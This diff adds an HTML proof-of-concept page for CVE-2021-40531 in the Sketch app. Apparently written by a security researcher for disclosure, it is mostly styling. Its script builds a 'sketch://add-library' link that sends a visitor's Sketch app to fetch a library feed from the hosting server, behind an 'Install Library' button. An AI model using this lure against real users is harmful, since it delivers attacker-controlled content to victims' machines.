@@ -1,0 +1,78 @@
+<html>
+  <head>
+    <style>
+      body {
+        font-family: -apple-system, sans-serif;
+        background: #e5e7eb;
+        color: #111827;
+
+        margin: 0;
+
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      h1 {
+        margin: 0;
+      }
+
+      .content {
+        background: #ffffff;
+        width: 512px;
+
+        padding: 1rem;
+        border-radius: 0.5rem;
+
+        box-shadow: 0px 8px 32px #9ca3af;
+      }
+
+      a,
+      a:visited {
+        color: #2563eb;
+      }
+
+      #link {
+        display: block;
+
+        margin-top: 2rem;
+        padding: 1rem;
+
+        background: #111827;
+        color: #ffffff;
+
+        border-radius: 0.25rem;
+
+        text-decoration: none;
+
+        transition: all 0.25s;
+      }
+
+      #link:hover {
+        background: #3b82f6;
+        box-shadow: 0px 2px 8px #9ca3af;
+        transform: translateY(-2px);
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="content">
+      <h1>CVE-2021-40531 Demo</h1>
+      <span>by <a href="https://twitter.com/jonpalmisc">@jonpalmisc</a></span>
+
+      <a id="link">Install Library &#x2192;</a>
+    </div>
+
+    <script>
+      let TEMPLATE =
+        "sketch://add-library?url=http%3A%2F%2F_HOSTNAME_%3A8080%2Ffeed.rss";
+
+      let server = window.location.hostname;
+      console.log(server);
+
+      let link = document.getElementById("link");
+      link.href = TEMPLATE.replace("_HOSTNAME_", server);
+    </script>
+  </body>
+</html>
